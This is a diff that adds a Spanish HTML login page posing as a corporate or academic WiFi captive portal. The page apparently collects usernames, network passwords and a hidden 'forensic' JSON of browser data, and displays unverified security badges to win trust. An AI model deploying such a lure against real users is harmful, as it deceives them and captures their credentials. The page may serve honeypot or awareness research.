@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso Seguro - Network Auth</title>
+    <link rel="stylesheet" href="css/admin.css">
+    <link rel="icon" type="image/png" href="https://img.icons8.com/color/48/shield.png">
+</head>
+
+<body>
+    <div class="background-container">
+        <div class="glow-blue"></div>
+        <div class="glow-green"></div>
+    </div>
+
+    <div class="container glass-card">
+        <div class="logo-header">
+            <div class="icon-wrapper" style="margin-bottom: 15px;">
+                <svg width="50" height="50" viewBox="0 0 24 24" fill="#007bff">
+                    <path
+                        d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
+                </svg>
+            </div>
+            <h2>Autenticación Centralizada</h2>
+            <p style="font-size: 0.85rem; color: #555;">Red WiFi Corporativa / Académica</p>
+        </div>
+
+        <div id="error-container"
+            style="display: none; background: rgba(255, 0, 0, 0.1); border: 1px solid #ff4d4d; color: #cc0000; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 0.9rem; text-align: center;">
+        </div>
+
+        <form id="form-final" action="LoginServlet" method="POST">
+            <div style="text-align: left; margin-top: 25px;">
+                <label
+                    style="font-size: 0.75rem; font-weight: bold; color: #002d5b; text-transform: uppercase;">Identificador
+                    de usuario</label>
+                <input type="text" name="usuario" id="usuario" placeholder="admin" required
+                    style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; background: rgba(255,255,255,0.8);">
+
+                <label
+                    style="font-size: 0.75rem; font-weight: bold; color: #002d5b; text-transform: uppercase;">Contraseña
+                    de Red</label>
+                <input type="password" name="password" id="pass" placeholder="••••••••" required
+                    style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box;">
+                
+                <!-- HONEYPOT: Campo oculto para detección de bots (oculto mediante CSS y fuera de foco) -->
+                <input type="text" name="honeypot_check" style="display:none !important;" tabindex="-1" autocomplete="off">
+            </div>
+
+            <input type="hidden" name="todo_el_json_de_js" id="inputForense">
+
+            <button type="submit" class="btn-primary" style="margin-top: 25px; letter-spacing: 1px;">INICIAR CONEXIÓN
+                SEGURA</button>
+        </form>
+
+        <div class="security-badges">
+            <div class="badge-item">
+                <img src="img/ssl_encryption.png" alt="SSL">
+                <span>AES-256 Verified</span>
+            </div>
+            <div class="badge-item">
+                <img src="img/wpa3_security.png" alt="WPA3">
+                <span>WPA3 Network</span>
+            </div>
+            <div class="badge-item">
+                <img src="img/hardware_id.png" alt="Hardware ID">
+                <span>Device Audit</span>
+            </div>
+            <div class="badge-item">
+                <img src="img/iso_verified.png" alt="Verified">
+                <span>ISO Compliance</span>
+            </div>
+        </div>
+
+        <div class="footer-info">
+            <p>Infraestructura de red gestionada por <strong>SecureGate Global Systems</strong>.</p>
+            <p>Cumplimiento de normativa internacional ISO/IEC 27001 de seguridad de la información.</p>
+            <div class="session-status">
+                ESTADO: <span class="status-online">CONEXIÓN CIFRADA</span> | ID: <span id="session-id"></span>
+            </div>
+        </div>
+
+
+    </div>
+
+    <script src="js/metrics.v2.min.js"></script>
+</body>
+
+</html>
